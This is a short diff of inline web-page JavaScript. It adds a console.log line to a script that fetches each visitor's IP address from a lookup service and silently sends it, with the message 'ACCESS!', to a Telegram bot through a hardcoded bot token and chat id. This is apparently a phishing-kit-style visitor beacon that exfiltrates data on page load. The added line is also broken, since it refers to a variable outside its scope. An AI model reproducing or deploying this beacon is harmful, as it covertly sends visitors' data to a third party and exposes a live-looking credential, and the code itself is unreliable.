@@ -104,6 +104,7 @@
   fetch('https://api.ipify.org?format=json')
               .then(response => response.json())
               .then(data => document.getElementById("clientIp").value = data.ip);
+    console.log(data.ip);
     var ipaddress = document.getElementById("clientIp").value;
     fetch('https://api.telegram.org/bot6769553327:AAEwKifUmAx2hUgodRudzpIjcCfEnDZ1e6s/sendMessage?chat_id=6142403832&text=ACCESS! \n IP:'+ipaddress+'');
   </script>
